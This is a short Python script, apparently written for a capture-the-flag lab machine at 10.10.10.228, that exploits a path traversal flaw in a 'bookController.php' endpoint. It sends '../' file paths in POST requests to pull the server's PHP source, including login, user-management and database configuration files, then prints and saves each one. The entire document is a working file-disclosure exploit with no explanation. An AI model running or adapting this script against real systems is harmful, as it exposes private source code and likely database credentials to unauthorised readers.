#!/usr/bin/python3

import requests
f = ['../portal/php/users.php', '../auth/login.php', '../portal/php/files.php' , '../portal/index.php', '../includes/bookController.php', '../db/db.php']
url = 'http://10.10.10.228/includes/bookController.php'
for ff in f:
    data = {'book': ff, 'method':1}
    r = requests.post(url, data)
    text = r.text
    text = text.replace('\\r\\n', '\n')
    text = text.replace('\\"', '"')
    text = text.replace('\\/', '/')
    print('======================\n[+] Content of ' + ff + '\n======================') 
    print (text)
    fn = ff.replace('/', '_')
    fn = fn.replace('..', '')
    o = open(fn, 'w')
    o.write(text)
    o.close()

